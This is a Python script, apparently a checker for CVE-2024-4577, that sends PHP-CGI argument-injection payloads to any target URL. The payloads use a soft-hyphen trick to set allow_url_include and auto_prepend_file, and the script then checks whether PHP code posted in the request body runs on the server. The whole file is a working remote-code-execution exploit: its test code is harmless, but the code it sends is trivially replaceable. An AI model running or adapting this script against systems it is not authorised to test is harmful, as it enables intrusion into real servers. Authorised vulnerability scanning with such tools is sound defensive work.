import requests
import argparse
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
requests.packages.urllib3.disable_warnings()

payloads = [
    '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',
    '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',
]

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 -t TARGET""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
args = parser.parse_args()

url = args.target.rstrip('/')
php_code = '<?php echo "1337"; ?>'
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

#print("CVE-2024-4577 exploitability test on " + url)

for payload in payloads:
    test = f"{url}{payload}"
    #print(f"--> {test}")
    
    try:
        response = requests.post(test, headers=headers, data=php_code, verify=False)
        if('1337' in response.text):
            print(f'{test} is exploitable')
    except:
        pass
